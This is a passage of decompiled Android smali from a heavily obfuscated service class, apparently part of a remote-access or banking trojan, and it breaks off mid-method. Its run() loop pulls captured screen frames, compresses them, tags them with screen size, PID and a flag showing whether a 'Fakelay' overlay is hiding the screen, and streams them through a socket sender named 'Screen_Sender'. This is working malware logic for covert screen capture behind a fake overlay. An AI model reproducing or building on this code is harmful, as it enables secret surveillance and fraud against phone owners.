.class Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;
.super Ljava/lang/Object;
.source "khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->pr()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;


# direct methods
.method constructor <init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;)V
    .locals 0

    .line 475
    iput-object p1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;->this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 8

    .line 479
    :goto_0
    sget-boolean v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->ISON:Z

    const/4 v1, 0x1

    const/4 v2, 0x0

    const/4 v3, 0x0

    if-eqz v0, :cond_5

    .line 482
    :try_start_0
    sget-boolean v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->ctd:Z

    if-eqz v0, :cond_3

    .line 486
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->syc:Ljava/lang/Object;

    monitor-enter v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/OutOfMemoryError; {:try_start_0 .. :try_end_0} :catch_1

    .line 487
    :try_start_1
    iget-object v4, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;->this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;

    iget-object v4, v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->bts:Ljava/util/List;

    invoke-interface {v4}, Ljava/util/List;->size()I

    move-result v4

    if-lez v4, :cond_0

    .line 489
    iget-object v4, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;->this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;

    iget-object v4, v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->bts:Ljava/util/List;

    invoke-interface {v4, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, [B

    .line 491
    iget-object v5, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;->this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;

    iget-object v5, v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->bts:Ljava/util/List;

    invoke-interface {v5, v3}, Ljava/util/List;->remove(I)Ljava/lang/Object;

    goto :goto_1

    :cond_0
    move-object v4, v2

    .line 494
    :goto_1
    monitor-exit v0
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    if-eqz v4, :cond_4

    :try_start_2
    const-string v0, "n"

    .line 502
    sget-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71;->appContext:Landroid/content/Context;

    sget-object v6, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_MySettings;->isblocked:Ljava/lang/String;

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v7

    invoke-static {v5, v6, v7}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_MySettings;->readBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Z

    move-result v5

    if-eqz v5, :cond_1

    .line 504
    sget-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71;->MyAccess:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb72;

    if-eqz v5, :cond_1

    .line 505
    sget-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71;->MyAccess:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb72;

    sget-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb72;->Fakelay:Landroid/widget/FrameLayout;

    invoke-virtual {v5}, Landroid/widget/FrameLayout;->getVisibility()I

    move-result v5

    if-nez v5, :cond_1

    const-string v0, "B"

    .line 512
    :cond_1
    invoke-static {v4}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->glemzcewmwedoivefnrzardjyuwvkapjmxxqkqdztfowhqamas47([B)[B

    move-result-object v4

    .line 514
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v6, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->scr:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, ":"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->display_height:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, ":"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->display_width:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, ":"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->PID:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, ":"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v4}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->tfrhvecdkkoxokyjrxrzaeeuzydhdqvydgaonqhatmdhqdizpo42(Ljava/lang/String;[B)[B

    move-result-object v0

    .line 515
    iget-object v4, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;->this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;

    iget-object v4, v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->Screen_Sender:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Socketdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9Sender;

    if-nez v4, :cond_2

    .line 516
    iget-object v4, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;->this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;

    invoke-static {}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Socketdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9Sender;->Instanse()Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Socketdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9Sender;

    move-result-object v5

    iput-object v5, v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->Screen_Sender:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Socketdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9Sender;

    .line 519
    :cond_2
    iget-object v4, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;->this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;

    iget-object v4, v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->Screen_Sender:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Socketdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9Sender;

    invoke-virtual {v4, v0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Socketdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9Sender;->sendBytes([B)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_2

    .line 526
    :catch_0
    :try_start_3
    invoke-static {}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->stopCapture()V

    .line 527
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;->this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;

    invoke-virtual {v0, v1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->stopForeground(Z)V

    .line 528
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;->this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;

    invoke-virtual {v0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->stopSelf()V

    .line 529
    sput-boolean v3, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->ISON:Z

    .line 530
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;->this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;

    iget-object v0, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->Screen_Sender:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Socketdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9Sender;

    if-eqz v0, :cond_4

    .line 531
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;->this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;

    iget-object v0, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->Screen_Sender:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Socketdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9Sender;

    invoke-virtual {v0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Socketdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9Sender;->closeSocket()V

    .line 532
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;->this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;

    iput-object v2, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->Screen_Sender:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Socketdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9Sender;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1
    .catch Ljava/lang/OutOfMemoryError; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_2

    :catchall_0
    move-exception v1

    .line 494
    :try_start_4
    monitor-exit v0
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    :try_start_5
    throw v1

    .line 539
    :cond_3
    invoke-static {}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->stopCapture()V

    .line 540
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;->this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;

    invoke-virtual {v0, v1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->stopForeground(Z)V

    .line 541
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;->this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;

    invoke-virtual {v0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->stopSelf()V

    .line 542
    sput-boolean v3, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->ISON:Z

    .line 543
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;->this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;

    iget-object v0, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->Screen_Sender:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Socketdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9Sender;

    if-eqz v0, :cond_4

    .line 544
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;->this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;

    iget-object v0, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->Screen_Sender:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Socketdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9Sender;

    invoke-virtual {v0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Socketdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9Sender;->closeSocket()V

    .line 545
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;->this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;

    iput-object v2, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->Screen_Sender:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Socketdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9Sender;
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1
    .catch Ljava/lang/OutOfMemoryError; {:try_start_5 .. :try_end_5} :catch_1

    :catch_1
    :cond_4
    :goto_2
    const-wide/16 v0, 0x1

    .line 558
    :try_start_6
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_6
    .catch Ljava/lang/InterruptedException; {:try_start_6 .. :try_end_6} :catch_2

    goto/16 :goto_0

    :catch_2
    nop

    goto/16 :goto_0

    .line 561
    :cond_5
    invoke-static {}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->stopCapture()V

    .line 562
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;->this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;

    invoke-virtual {v0, v1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->stopForeground(Z)V

    .line 563
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;->this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;

    invoke-virtual {v0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->stopSelf()V

    .line 564
    sput-boolean v3, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->ISON:Z

    .line 565
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;->this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;

    iget-object v0, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->Screen_Sender:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Socketdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9Sender;

    if-eqz v0, :cond_6

    .line 566
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27$1;->this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;

    iget-object v0, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->Screen_Sender:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Socketdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9Sender;

    invoke-virtual {v0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Socketdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9Sender;->closeSocket()V

    .line 567
